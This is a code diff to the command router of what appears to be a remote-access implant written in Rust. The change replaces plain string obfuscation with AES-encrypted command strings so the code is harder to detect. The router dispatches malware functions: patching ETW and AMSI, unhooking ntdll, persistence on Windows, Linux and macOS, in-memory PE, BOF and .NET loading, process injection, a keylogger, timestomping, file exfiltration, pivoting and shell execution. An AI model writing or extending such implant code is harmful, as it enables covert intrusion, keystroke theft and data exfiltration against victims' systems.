@@ -20,7 +20,8 @@ use crate::common::{CommandResponse, SecuredCommand};
 use crate::agent::scripting::ExtensionManager;
 use crate::agent::pivot::PivotManager;
 use crate::agent::jobs::JobManager;
-use crate::lc;
+use crate::strcrypt_rt;
+use strcrypt::aes_str;
 
 // ── Shared types ───────────────────────────────────────────────────────
 
@@ -107,146 +108,146 @@ pub async fn dispatch(ctx: &HandlerContext, msg: SecuredCommand) -> AgentAction 
 
 async fn route(ctx: &HandlerContext, cmd: &str, req_id: u64) -> DispatchResult {
     // ── Config & Mode ──────────────────────────────────────────────
-    if let Some(args) = cmd.strip_prefix(&lc!("sleep ")) {
+    if let Some(args) = cmd.strip_prefix(&aes_str!("sleep ")) {
         return config::handle_sleep(args);
     }
-    if cmd == lc!("beacon:mode active") {
+    if cmd == aes_str!("beacon:mode active") {
         return config::handle_beacon_mode(true);
     }
-    if cmd == lc!("beacon:mode passive") {
+    if cmd == aes_str!("beacon:mode passive") {
         return config::handle_beacon_mode(false);
     }
-    if cmd == lc!("fallback:config") {
+    if cmd == aes_str!("fallback:config") {
         return config::handle_fallback_config();
     }
 
     // ── Jobs ───────────────────────────────────────────────────────
-    if cmd == lc!("jobs:list") {
-        let info = lock_or_action!(ctx.job_manager, "job_manager").list_json();
+    if cmd == aes_str!("jobs:list") {
+        let info = lock_or_action!(ctx.job_manager, aes_str!("job_manager")).list_json();
         return DispatchResult::Reply(info, String::new(), 0, AgentAction::None);
     }
-    if let Some(args) = cmd.strip_prefix(&lc!("jobs:kill ")) {
+    if let Some(args) = cmd.strip_prefix(&aes_str!("jobs:kill ")) {
         let id = args.trim().parse::<u32>().unwrap_or(0);
-        let msg = lock_or_action!(ctx.job_manager, "job_manager").kill(id);
+        let msg = lock_or_action!(ctx.job_manager, aes_str!("job_manager")).kill(id);
         return DispatchResult::Reply(msg, String::new(), 0, AgentAction::None);
     }
-    if cmd == lc!("jobs:purge") {
-        let n = lock_or_action!(ctx.job_manager, "job_manager").purge_completed();
+    if cmd == aes_str!("jobs:purge") {
+        let n = lock_or_action!(ctx.job_manager, aes_str!("job_manager")).purge_completed();
         return DispatchResult::Reply(format!("Purged {} finished jobs", n), String::new(), 0, AgentAction::None);
     }
 
     // ── Network (pivot, proxy, rportfwd) ───────────────────────────
-    if let Some(args) = cmd.strip_prefix(&lc!("pivot:listener_tcp ")) {
+    if let Some(args) = cmd.strip_prefix(&aes_str!("pivot:listener_tcp ")) {
         return network::handle_pivot_tcp(ctx, args).await;
     }
-    if let Some(args) = cmd.strip_prefix(&lc!("pivot:listener_smb ")) {
+    if let Some(args) = cmd.strip_prefix(&aes_str!("pivot:listener_smb ")) {
         return network::handle_pivot_smb(ctx, args).await;
     }
-    if cmd.starts_with(&lc!("proxy:start ")) {
+    if cmd.starts_with(&aes_str!("proxy:start ")) {
         let (o, e, c) = network::handle_proxy_start(ctx, cmd, req_id).await;
         return DispatchResult::Reply(o, e, c, AgentAction::None);
     }
-    if cmd == lc!("proxy:stop") {
+    if cmd == aes_str!("proxy:stop") {
         let (o, e, c) = network::handle_proxy_stop(ctx);
         return DispatchResult::Reply(o, e, c, AgentAction::None);
     }
-    if cmd.starts_with(&lc!("rportfwd:start ")) {
+    if cmd.starts_with(&aes_str!("rportfwd:start ")) {
         return network::handle_rportfwd_start(ctx, cmd).await;
     }
-    if cmd.starts_with(&lc!("rportfwd:stop ")) {
+    if cmd.starts_with(&aes_str!("rportfwd:stop ")) {
         return network::handle_rportfwd_stop(ctx, cmd);
     }
-    if cmd == lc!("rportfwd:list") {
+    if cmd == aes_str!("rportfwd:list") {
         return network::handle_rportfwd_list(ctx);
     }
 
     // ── Evasion ────────────────────────────────────────────────────
-    if cmd == lc!("evasion:patch_etw")          { return evasion::handle_patch_etw(); }
-    if cmd == lc!("evasion:patch_amsi")         { return evasion::handle_patch_amsi(); }
-    if cmd == lc!("evasion:unhook_ntdll")       { return evasion::handle_unhook_ntdll(); }
-    if cmd == lc!("evasion:patch_all")          { return evasion::handle_patch_all(); }
-    if cmd == lc!("evasion:syscall_check")      { return evasion::handle_syscall_check(); }
-    if cmd == lc!("evasion:encrypt_heap_aes")   { return evasion::handle_encrypt_heap_aes(); }
-    if cmd == lc!("evasion:decrypt_heap_aes")   { return evasion::handle_decrypt_heap_aes(); }
+    if cmd == aes_str!("evasion:patch_etw")          { return evasion::handle_patch_etw(); }
+    if cmd == aes_str!("evasion:patch_amsi")         { return evasion::handle_patch_amsi(); }
+    if cmd == aes_str!("evasion:unhook_ntdll")       { return evasion::handle_unhook_ntdll(); }
+    if cmd == aes_str!("evasion:patch_all")          { return evasion::handle_patch_all(); }
+    if cmd == aes_str!("evasion:syscall_check")      { return evasion::handle_syscall_check(); }
+    if cmd == aes_str!("evasion:encrypt_heap_aes")   { return evasion::handle_encrypt_heap_aes(); }
+    if cmd == aes_str!("evasion:decrypt_heap_aes")   { return evasion::handle_decrypt_heap_aes(); }
 
     // ── Persistence ────────────────────────────────────────────────
-    if cmd == lc!("persist:list") { return persistence::handle_list(); }
+    if cmd == aes_str!("persist:list") { return persistence::handle_list(); }
 
     // Windows
-    if let Some(a) = cmd.strip_prefix(&lc!("persist:run_hklm_remove ")) { return persistence::handle_run_hklm_remove(a); }
-    if let Some(a) = cmd.strip_prefix(&lc!("persist:run_hklm "))        { return persistence::handle_run_hklm(a); }
-    if let Some(a) = cmd.strip_prefix(&lc!("persist:run_remove "))      { return persistence::handle_run_remove(a); }
-    if let Some(a) = cmd.strip_prefix(&lc!("persist:run "))             { return persistence::handle_run(a); }
-    if let Some(a) = cmd.strip_prefix(&lc!("persist:task_remove "))     { return persistence::handle_task_remove(a); }
-    if let Some(a) = cmd.strip_prefix(&lc!("persist:task "))            { return persistence::handle_task(a); }
-    if let Some(a) = cmd.strip_prefix(&lc!("persist:startup_remove "))  { return persistence::handle_startup_remove(a); }
-    if let Some(a) = cmd.strip_prefix(&lc!("persist:startup "))         { return persistence::handle_startup(a); }
+    if let Some(a) = cmd.strip_prefix(&aes_str!("persist:run_hklm_remove ")) { return persistence::handle_run_hklm_remove(a); }
+    if let Some(a) = cmd.strip_prefix(&aes_str!("persist:run_hklm "))        { return persistence::handle_run_hklm(a); }
+    if let Some(a) = cmd.strip_prefix(&aes_str!("persist:run_remove "))      { return persistence::handle_run_remove(a); }
+    if let Some(a) = cmd.strip_prefix(&aes_str!("persist:run "))             { return persistence::handle_run(a); }
+    if let Some(a) = cmd.strip_prefix(&aes_str!("persist:task_remove "))     { return persistence::handle_task_remove(a); }
+    if let Some(a) = cmd.strip_prefix(&aes_str!("persist:task "))            { return persistence::handle_task(a); }
+    if let Some(a) = cmd.strip_prefix(&aes_str!("persist:startup_remove "))  { return persistence::handle_startup_remove(a); }
+    if let Some(a) = cmd.strip_prefix(&aes_str!("persist:startup "))         { return persistence::handle_startup(a); }
 
     // Linux
-    if let Some(a) = cmd.strip_prefix(&lc!("persist:systemd_remove "))  { return persistence::handle_systemd_remove(a); }
-    if let Some(a) = cmd.strip_prefix(&lc!("persist:systemd "))         { return persistence::handle_systemd(a); }
-    if let Some(a) = cmd.strip_prefix(&lc!("persist:profile_remove "))  { return persistence::handle_profile_remove(a); }
-    if let Some(a) = cmd.strip_prefix(&lc!("persist:profile "))         { return persistence::handle_profile(a); }
+    if let Some(a) = cmd.strip_prefix(&aes_str!("persist:systemd_remove "))  { return persistence::handle_systemd_remove(a); }
+    if let Some(a) = cmd.strip_prefix(&aes_str!("persist:systemd "))         { return persistence::handle_systemd(a); }
+    if let Some(a) = cmd.strip_prefix(&aes_str!("persist:profile_remove "))  { return persistence::handle_profile_remove(a); }
+    if let Some(a) = cmd.strip_prefix(&aes_str!("persist:profile "))         { return persistence::handle_profile(a); }
 
     // macOS
-    if let Some(a) = cmd.strip_prefix(&lc!("persist:launchagent_remove ")) { return persistence::handle_launchagent_remove(a); }
-    if let Some(a) = cmd.strip_prefix(&lc!("persist:launchagent "))        { return persistence::handle_launchagent(a); }
+    if let Some(a) = cmd.strip_prefix(&aes_str!("persist:launchagent_remove ")) { return persistence::handle_launchagent_remove(a); }
+    if let Some(a) = cmd.strip_prefix(&aes_str!("persist:launchagent "))        { return persistence::handle_launchagent(a); }
 
     // Cross-platform cron (Linux and macOS share the command name; platform
     // dispatch happens inside the handler via cfg gates in mod.rs)
-    if let Some(a) = cmd.strip_prefix(&lc!("persist:cron_remove ")) {
+    if let Some(a) = cmd.strip_prefix(&aes_str!("persist:cron_remove ")) {
         #[cfg(target_os = "linux")]   { return persistence::handle_cron_linux_remove(a); }
         #[cfg(target_os = "macos")]   { return persistence::handle_cron_macos_remove(a); }
         #[cfg(not(any(target_os = "linux", target_os = "macos")))]
-        return wrap_result(Err::<String, String>("persist:cron is Linux/macOS only".into()));
+        return wrap_result(Err::<String, String>(aes_str!("persist:cron is Linux/macOS only")));
     }
-    if let Some(a) = cmd.strip_prefix(&lc!("persist:cron ")) {
+    if let Some(a) = cmd.strip_prefix(&aes_str!("persist:cron ")) {
         #[cfg(target_os = "linux")]   { return persistence::handle_cron_linux(a); }
         #[cfg(target_os = "macos")]   { return persistence::handle_cron_macos(a); }
         #[cfg(not(any(target_os = "linux", target_os = "macos")))]
-        return wrap_result(Err::<String, String>("persist:cron is Linux/macOS only".into()));
+        return wrap_result(Err::<String, String>(aes_str!("persist:cron is Linux/macOS only")));
     }
 
     // ── Execution (inmem, extensions, shell) ───────────────────────
-    if let Some(shell_cmd) = cmd.strip_prefix(&lc!("bg ")) {
+    if let Some(shell_cmd) = cmd.strip_prefix(&aes_str!("bg ")) {
         return execution::handle_bg(ctx, shell_cmd, req_id);
     }
-    if cmd.starts_with(&lc!("ext:load "))     { return execution::handle_extension_bg(ctx, cmd, req_id); }
-    if cmd.starts_with(&lc!("inmem:pe "))     { return execution::handle_load_pe(ctx, cmd, req_id); }
-    if cmd.starts_with(&lc!("inmem:bof "))    { return execution::handle_run_bof(ctx, cmd, req_id); }
-    if cmd.starts_with(&lc!("inmem:dotnet ")) {
+    if cmd.starts_with(&aes_str!("ext:load "))     { return execution::handle_extension_bg(ctx, cmd, req_id); }
+    if cmd.starts_with(&aes_str!("inmem:pe "))     { return execution::handle_load_pe(ctx, cmd, req_id); }
+    if cmd.starts_with(&aes_str!("inmem:bof "))    { return execution::handle_run_bof(ctx, cmd, req_id); }
+    if cmd.starts_with(&aes_str!("inmem:dotnet ")) {
         let (o, e, c) = execution::handle_run_dotnet(cmd);
         return DispatchResult::Reply(o, e, c, AgentAction::None);
     }
 
     // ── Files & Artifacts ──────────────────────────────────────────
-    if cmd.starts_with(&lc!("timestomp:set "))      { return files::handle_timestomp_set(cmd); }
-    if cmd.starts_with(&lc!("timestomp "))           { return files::handle_timestomp(cmd); }
-    if let Some(path) = cmd.strip_prefix(&lc!("secure_delete ")) {
+    if cmd.starts_with(&aes_str!("timestomp:set "))      { return files::handle_timestomp_set(cmd); }
+    if cmd.starts_with(&aes_str!("timestomp "))           { return files::handle_timestomp(cmd); }
+    if let Some(path) = cmd.strip_prefix(&aes_str!("secure_delete ")) {
         return wrap_result(crate::agent::artifacts::secure_delete(path));
     }
-    if cmd.starts_with(&lc!("ads:write "))  { return files::handle_ads_write(cmd); }
-    if cmd.starts_with(&lc!("ads:read "))   { return files::handle_ads_read(cmd); }
-    if let Some(path) = cmd.strip_prefix(&lc!("ads:list ")) { return files::handle_ads_list(path); }
-    if cmd.starts_with(&lc!("file:read_recursive|")) {
+    if cmd.starts_with(&aes_str!("ads:write "))  { return files::handle_ads_write(cmd); }
+    if cmd.starts_with(&aes_str!("ads:read "))   { return files::handle_ads_read(cmd); }
+    if let Some(path) = cmd.strip_prefix(&aes_str!("ads:list ")) { return files::handle_ads_list(path); }
+    if cmd.starts_with(&aes_str!("file:read_recursive|")) {
         files::handle_recursive_download(ctx, cmd, req_id).await;
         return DispatchResult::AlreadySent(AgentAction::None);
     }
-    if cmd.starts_with(&lc!("file:write|")) {
+    if cmd.starts_with(&aes_str!("file:write|")) {
         let (o, e, c) = files::handle_file_write(cmd);
         return DispatchResult::Reply(o, e, c, AgentAction::None);
     }
-    if cmd.starts_with(&lc!("file:write_chunk|")) {
+    if cmd.starts_with(&aes_str!("file:write_chunk|")) {
         let (o, e, c) = files::handle_file_write_chunked(cmd);
         return DispatchResult::Reply(o, e, c, AgentAction::None);
     }
-    if cmd.starts_with(&lc!("file:read|")) {
+    if cmd.starts_with(&aes_str!("file:read|")) {
         // For files >= 50 MB, switch to chunked transfer automatically.
         // This avoids the 500 MB cap in read_file_to_b64 and keeps each
         // HTTP payload to ~10 MB regardless of total file size.
         // Small files still use the inline file:data path so their content
         // appears directly in the terminal.
-        let path = &cmd[lc!("file:read|").len()..];
+        let path = &cmd[aes_str!("file:read|").len()..];
         let size = std::fs::metadata(path).map(|m| m.len()).unwrap_or(0);
         if size >= 50 * 1024 * 1024 {
             files::handle_file_download_chunked(ctx, cmd, req_id).await;
@@ -255,35 +256,35 @@ async fn route(ctx: &HandlerContext, cmd: &str, req_id: u64) -> DispatchResult {
         let (o, e, c) = files::handle_file_read(cmd);
         return DispatchResult::Reply(o, e, c, AgentAction::None);
     }
-    if let Some(path) = cmd.strip_prefix(&lc!("fs:ls ")) {
+    if let Some(path) = cmd.strip_prefix(&aes_str!("fs:ls ")) {
         return DispatchResult::Reply(
             crate::agent::scripting::get_directory_json(path), String::new(), 0, AgentAction::None,
         );
     }
 
     // ── Process (injection, migration, keylogger) ──────────────────
-    if cmd.starts_with(&lc!("proc:inject ")) {
+    if cmd.starts_with(&aes_str!("proc:inject ")) {
         let (o, e, c) = process::handle_injection(cmd.to_string()).await;
         return DispatchResult::Reply(o, e, c, AgentAction::None);
     }
-    if let Some(args) = cmd.strip_prefix(&lc!("migrate:spawn "))  { return process::handle_migrate_spawn(ctx, args, req_id); }
-    if let Some(args) = cmd.strip_prefix(&lc!("migrate:inject ")) { return process::handle_migrate_inject(ctx, args, req_id); }
-    if cmd == lc!("keylogger:start") { return DispatchResult::Reply(crate::agent::keylogger::start(), String::new(), 0, AgentAction::None); }
-    if cmd == lc!("keylogger:stop")  { return DispatchResult::Reply(crate::agent::keylogger::stop(), String::new(), 0, AgentAction::None); }
-    if cmd == lc!("keylogger:dump") {
+    if let Some(args) = cmd.strip_prefix(&aes_str!("migrate:spawn "))  { return process::handle_migrate_spawn(ctx, args, req_id); }
+    if let Some(args) = cmd.strip_prefix(&aes_str!("migrate:inject ")) { return process::handle_migrate_inject(ctx, args, req_id); }
+    if cmd == aes_str!("keylogger:start") { return DispatchResult::Reply(crate::agent::keylogger::start(), String::new(), 0, AgentAction::None); }
+    if cmd == aes_str!("keylogger:stop")  { return DispatchResult::Reply(crate::agent::keylogger::stop(), String::new(), 0, AgentAction::None); }
+    if cmd == aes_str!("keylogger:dump") {
         let logs = crate::agent::keylogger::get_logs();
-        let out = if logs.is_empty() { lc!("(Buffer Empty)") } else { logs };
+        let out = if logs.is_empty() { aes_str!("(Buffer Empty)") } else { logs };
         return DispatchResult::Reply(out, String::new(), 0, AgentAction::None);
     }
 
     // ── Lifecycle ──────────────────────────────────────────────────
-    if cmd == lc!("sys:die") {
+    if cmd == aes_str!("sys:die") {
         return lifecycle::handle_self_destruct(ctx, req_id).await;
     }
 
     // ── Explicit shell command ─────────────────────────────────────
-    if cmd.starts_with(&lc!("shell ")) {
-        return execution::handle_shell(cmd.strip_prefix(&lc!("shell ")).unwrap_or("")).await;
+    if cmd.starts_with(&aes_str!("shell ")) {
+        return execution::handle_shell(cmd.strip_prefix(&aes_str!("shell ")).unwrap_or("")).await;
     }
     if cmd.starts_with("!") {
         return execution::handle_shell(&cmd[1..]).await;
